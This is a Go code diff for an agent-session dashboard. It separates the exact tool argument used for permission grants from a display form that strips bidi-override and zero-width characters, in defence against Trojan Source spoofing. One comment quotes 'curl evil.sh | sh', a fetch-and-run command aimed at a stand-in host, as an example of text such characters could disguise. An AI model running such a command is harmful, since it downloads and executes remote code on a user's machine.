@@ -17,6 +17,7 @@ import (
 	"sync"
 	"sync/atomic"
 	"time"
+	"unicode"
 
 	"github.com/lx-wnk/agent-dashboard/sdk"
 )
@@ -302,20 +303,45 @@ type pendingToolInput struct {
 
 const toolDetailMaxLen = 120
 
-// toolDetail returns the tool's own human-readable argument, truncated so one
-// entry stays one line: a Bash command can run to many lines on its own.
-func toolDetail(raw json.RawMessage) string {
+// toolArgument returns the tool's own argument verbatim: the Bash command, or
+// the Edit/Write path. A permission preset is matched by exact equality, so
+// anything that reaches a grant must use this and never the display form.
+func toolArgument(raw json.RawMessage) string {
 	var inp pendingToolInput
 	_ = json.Unmarshal(raw, &inp)
-	d := inp.Command
-	if d == "" {
-		d = inp.FilePath
+	if inp.Command != "" {
+		return inp.Command
 	}
-	d = strings.Join(strings.Fields(d), " ")
-	if len(d) > toolDetailMaxLen {
+	return inp.FilePath
+}
+
+// stripDeceptiveRunes removes control, bidi-override and other format runes.
+// This text is agent-authored and is read by a human deciding what the agent
+// did: U+202E renders "curl evil.sh | sh" as innocuous reversed text, and a
+// zero-width space hides a word boundary (Trojan Source, CVE-2021-42574).
+func stripDeceptiveRunes(s string) string {
+	return strings.Map(func(r rune) rune {
+		if r == '\t' || r == '\n' || r == '\r' {
+			return r // real whitespace; strings.Fields collapses it next
+		}
+		if unicode.IsControl(r) || unicode.Is(unicode.Cf, r) || unicode.Is(unicode.Bidi_Control, r) {
+			return -1
+		}
+		return r
+	}, s)
+}
+
+// toolDetail is the display form of toolArgument: stripped of characters that
+// can make a command render as a different one, collapsed to one line, and cut
+// so a single entry cannot dominate the list.
+func toolDetail(raw json.RawMessage) string {
+	d := strings.Join(strings.Fields(stripDeceptiveRunes(toolArgument(raw))), " ")
+	r := []rune(d)
+	if len(r) > toolDetailMaxLen {
 		// Mark the cut: a silently clipped command reads like a different,
-		// shorter one that was never run.
-		return d[:toolDetailMaxLen] + "…"
+		// shorter one that was never run. Slice runes, not bytes -- a cut
+		// through a multi-byte character yields U+FFFD on the wire.
+		return string(r[:toolDetailMaxLen]) + "…"
 	}
 	return d
 }
@@ -869,7 +895,7 @@ func ParseSessionFile(path string) (*SessionData, error) {
 	if n := len(toolUseOrder); n > 0 {
 		tu := toolUseOrder[n-1]
 		if !resolvedToolUseIDs[tu.id] {
-			pattern := toolDetail(tu.input)
+			pattern := toolArgument(tu.input)
 			data.PendingToolUse = &sdk.PendingToolUse{
 				ID:      tu.id,
 				Tool:    tu.name,
